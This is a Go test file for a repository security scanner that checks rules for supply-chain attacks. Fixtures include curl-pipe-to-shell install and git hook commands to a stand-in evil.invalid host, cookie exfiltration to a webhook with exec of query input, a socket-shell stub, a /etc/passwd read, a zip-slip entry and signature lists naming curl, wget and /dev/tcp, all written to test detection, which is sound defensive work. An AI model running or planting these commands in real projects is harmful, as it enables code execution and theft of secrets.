package scan

import (
	"archive/zip"
	"bytes"
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/Kevin-Umali/repyy/internal/model"
)

func writeFixture(t *testing.T, root, name, body string) {
	t.Helper()
	path := filepath.Join(root, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func hasRule(findings []model.Finding, id string) bool {
	for _, f := range findings {
		if f.RuleID == id {
			return true
		}
	}
	return false
}

func TestBuiltinsCompileAndHaveUniqueIDs(t *testing.T) {
	seen := map[string]bool{}
	for _, rule := range BuiltinRules() {
		if seen[rule.ID] {
			t.Fatalf("duplicate rule id %s", rule.ID)
		}
		seen[rule.ID] = true
		if rule.re == nil {
			t.Fatalf("rule %s was not compiled", rule.ID)
		}
	}
}

func TestDetectsDownloadExecuteAndLifecycle(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "package.json", `{"scripts":{"postinstall":"curl https://evil.invalid/p | sh"}}`)
	coverage, findings := New(Options{}).Scan(context.Background(), root)
	if !coverage.Complete {
		t.Fatalf("expected complete coverage: %+v", coverage)
	}
	for _, id := range []string{"CHAIN-001", "PKG-001"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s in %+v", id, findings)
		}
	}
}

func TestCleanRepositoryHasNoFindings(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "main.go", "package main\n\nfunc main() {}\n")
	writeFixture(t, root, "README.md", "# Small example\nThis project prints a greeting.\n")
	writeFixture(t, root, "LICENSE", "test fixture license\n")
	coverage, findings := New(Options{}).Scan(context.Background(), root)
	if !coverage.Complete {
		t.Fatal("clean scan should be complete")
	}
	if len(findings) != 0 {
		t.Fatalf("unexpected findings: %+v", findings)
	}
}

func TestDisabledGitHooksAreNotFlagged(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, ".git/config", "[core]\n\thooksPath = /dev/null\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	if hasRule(findings, "GITHOOK-001") {
		t.Fatalf("safe disabled hooks path was flagged: %+v", findings)
	}
}

func TestDocumentationExamplesDoNotProduceCriticalFindings(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "LICENSE", "test fixture license\n")
	writeFixture(t, root, "README.md", "Security docs: never run `curl https://evil.invalid/p | sh` or use `/dev/tcp/host/1`.\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, finding := range findings {
		if finding.Severity == model.SeverityCritical {
			t.Fatalf("documentation example became critical: %+v", finding)
		}
		if finding.Path == "README.md" && finding.Context != "documentation" {
			t.Fatalf("documentation was classified incorrectly: %+v", finding)
		}
	}
}

func TestSignatureCorpusIsAggregatedAndDowngraded(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	body := "PATTERNS='curl|wget|eval|exec|xmrig'\nPATTERNS='curl|wget|eval|exec|xmrig'\n"
	writeFixture(t, root, "malware_signatures.sh", body)
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, finding := range findings {
		if finding.Path != "malware_signatures.sh" {
			continue
		}
		if finding.Context != "detection-definition" || finding.Confidence != model.ConfidenceLow {
			t.Fatalf("signature finding was not contextualized: %+v", finding)
		}
		if finding.Occurrences < 2 {
			t.Fatalf("repeated signature hits were not aggregated: %+v", finding)
		}
	}
}

func TestScannerImplementationPatternsAreDowngraded(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "scanner.go", `package scanner

func signatures() {
	for _, needle := range []string{"eval(", "exec(", "curl ", "/dev/tcp/"} {
		_ = needle
	}
}
`)
	_, findings := New(Options{}).Scan(context.Background(), root)
	if len(findings) == 0 {
		t.Fatal("expected contextual findings for scanner signatures")
	}
	for _, finding := range findings {
		if finding.Context != "detection-definition" || finding.Confidence != model.ConfidenceLow || finding.Severity == model.SeverityCritical {
			t.Fatalf("scanner signature was not safely contextualized: %+v", finding)
		}
	}
}

func TestRepositoryHygieneIsInformational(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "main.go", "package main\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"REPO-001", "REPO-002"} {
		if !hasRule(findings, id) {
			t.Fatalf("missing %s in %+v", id, findings)
		}
	}
}

func TestDetectsExfiltrationAndBackdoorSignals(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "server.js", "const c = document.cookie; fetch('https://discord.com/api/webhooks/1/x'); exec(req.query.cmd);\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"EXFIL-002", "NET-002", "BACKDOOR-001"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s in %+v", id, findings)
		}
	}
}

func TestDetectsConfirmedPackageNamesAcrossEcosystems(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "package.json", `{"dependencies":{"tailwind-form-kit":"1.0.0","axios":"1.14.1","internal-widget":"100.100.100"}}`)
	writeFixture(t, root, "requirements.txt", "openaii==1.0.0\n")
	writeFixture(t, root, "go.mod", "module example.test/x\n\nrequire github.com/utilizedsun/layout v1.0.0\n")
	writeFixture(t, root, "Cargo.toml", "[dependencies]\ntinymember = \"1.0.0\"\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, advisory := range []string{"GHSA-p7c5-phj5-qm49", "GHSA-q5h5-h6mj-vhgv", "GHSA-cvm3-cf32-fx43", "GHSA-jpmw-jcm2-3wcq"} {
		if !hasRule(findings, "IOC-PKG-"+advisory) {
			t.Errorf("missing package advisory %s in %+v", advisory, findings)
		}
	}
	if !hasRule(findings, "IOC-PKG-MSFT-2026-04-01-AXIOS") {
		t.Errorf("missing version-specific Sapphire Sleet package IOC in %+v", findings)
	}
	if !hasRule(findings, "PKG-005") {
		t.Errorf("missing dependency-confusion version signal in %+v", findings)
	}
}

func TestKnownBenignPackageIsNotBlocklisted(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "package.json", `{"dependencies":{"call-bind-apply-helpers":"1.0.2"}}`)
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, finding := range findings {
		if strings.HasPrefix(finding.RuleID, "IOC-PKG-") {
			t.Fatalf("known-benign dependency was blocklisted: %+v", finding)
		}
	}
}
func TestEvidenceRedactsCredentials(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "credentials.txt", "AKIAABCDEFGHIJKLMNOP\napi_key=super-secret-value\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "SECRET-002") {
		t.Fatalf("credential was not detected: %+v", findings)
	}
	for _, finding := range findings {
		if strings.Contains(finding.Evidence, "AKIAABCDEFGHIJKLMNOP") || strings.Contains(finding.Evidence, "super-secret-value") {
			t.Fatalf("credential leaked in evidence: %+v", finding)
		}
	}
}

func TestEscapingSymlink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlink creation requires privileges")
	}
	root := t.TempDir()
	if err := os.Symlink(filepath.Join(root, "..", "secret"), filepath.Join(root, "escape")); err != nil {
		t.Fatal(err)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "SYMLINK-001") {
		t.Fatalf("escaping symlink was not reported: %+v", findings)
	}
}

func TestZipSlipEntry(t *testing.T) {
	root := t.TempDir()
	var archive bytes.Buffer
	zw := zip.NewWriter(&archive)
	f, err := zw.Create("../../escape.sh")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.Write([]byte("echo harmless fixture")); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "fixture.zip"), archive.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "ARCHIVE-001") {
		t.Fatalf("zip traversal was not reported: %+v", findings)
	}
}

func TestRequiredDetectionFamilies(t *testing.T) {
	ruleIDs := map[string]bool{}
	for _, rule := range BuiltinRules() {
		ruleIDs[rule.ID] = true
	}
	// These keep the documented high-level detection families represented.
	want := []string{
		"EXEC-001", "OBFS-001", "OBFS-002", "PKG-001", "CHAIN-001",
		"NPMRC-001", "NPMRC-002", "LOCK-001", "GITHOOK-001", "IPURL-001",
		"CRED-001", "FINGERPRINT-001", "MINER-001", "UNICODE-001", "EVADE-001",
		"IDE-001", "OBFS-003", "CICD-001", "SECRET-001", "IMPORT-001",
		"DOCKER-001", "REVSHELL-001", "EXFIL-001", "PROTO-001", "PKG-004",
		"TYPOSQUAT-001",
	}
	for _, id := range want {
		if !ruleIDs[id] && !strings.HasPrefix(id, "PKG-") {
			t.Errorf("detection family missing rule %s", id)
		}
	}

	root := t.TempDir()
	writeFixture(t, root, "packed.js", "eval('x');\n"+strings.Repeat("abcdefghijklmnopqrstuvwxyz0123456789", 20))
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "OBFS-004") || !hasRule(findings, "OBFS-005") {
		t.Errorf("missing generated minification/entropy checks: %+v", findings)
	}
}

func TestDependencyTreesSkippedByDefault(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "node_modules/evil/index.js", "curl https://evil.invalid/x | sh")
	coverage, findings := New(Options{}).Scan(context.Background(), root)
	if len(findings) != 0 {
		t.Fatalf("dependency tree should be skipped: %+v", findings)
	}
	if len(coverage.Skipped) == 0 {
		t.Fatal("skip should be disclosed")
	}
}

func TestV021CoverageHardening(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, ".git/hooks/pre-commit", "#!/bin/sh\ncurl https://evil.invalid/hook | sh\n")
	writeFixture(t, root, ".github/workflows/unsafe.yml", "steps:\n  - uses: example/action@main\n")
	writeFixture(t, root, ".vscode/extensions.json", `{"recommendations":["unknown.untrusted"]}`)
	writeFixture(t, root, "obfuscated.js", `const x = 'lave'.split('').reverse().join(''); process.mainModule.require(x);`)
	writeFixture(t, root, "Dockerfile", "ADD https://evil.invalid/tool /usr/bin/tool\n")
	writeFixture(t, root, "shell.py", `python -c 'import socket; socket.socket(); /bin/sh'`)
	writeFixture(t, root, "reader.js", `fs.readFileSync('/etc/passwd')`)
	writeFixture(t, root, "unicode.js", "const soft = 'a\u00adb';\n")
	writeFixture(t, root, "package.json", `{"dependencies":{"webpck":"1.0.0"},"bin":"../outside.js"}`)
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"GITHOOK-002", "CICD-003", "IDE-002", "OBFS-006", "IMPORT-003", "DOCKER-003", "REVSHELL-002", "CRED-002", "UNICODE-001", "TYPOSQUAT-001", "PKG-006"} {
		if !hasRule(findings, id) {
			t.Errorf("missing %s in %+v", id, findings)
		}
	}
}

func TestPrecisionExclusions(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "network.js", "fetch('http://127.0.0.1/x'); fetch('http://10.0.0.1/x');\n")
	writeFixture(t, root, "package-lock.json", strings.Repeat("a", 900)+"\n")
	writeFixture(t, root, ".github/workflows/safe.yml", "steps:\n  - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	for _, id := range []string{"IPURL-001", "OBFS-004", "CICD-003"} {
		if hasRule(findings, id) {
			t.Errorf("precision exclusion failed for %s: %+v", id, findings)
		}
	}
}

func TestPublicIPURLIsReported(t *testing.T) {
	root := t.TempDir()
	writeFixture(t, root, "README.md", "fixture\n")
	writeFixture(t, root, "LICENSE", "fixture\n")
	writeFixture(t, root, "network.js", "fetch('http://8.8.8.8/payload');\n")
	_, findings := New(Options{}).Scan(context.Background(), root)
	if !hasRule(findings, "IPURL-001") {
		t.Fatalf("public IP URL was not reported: %+v", findings)
	}
}
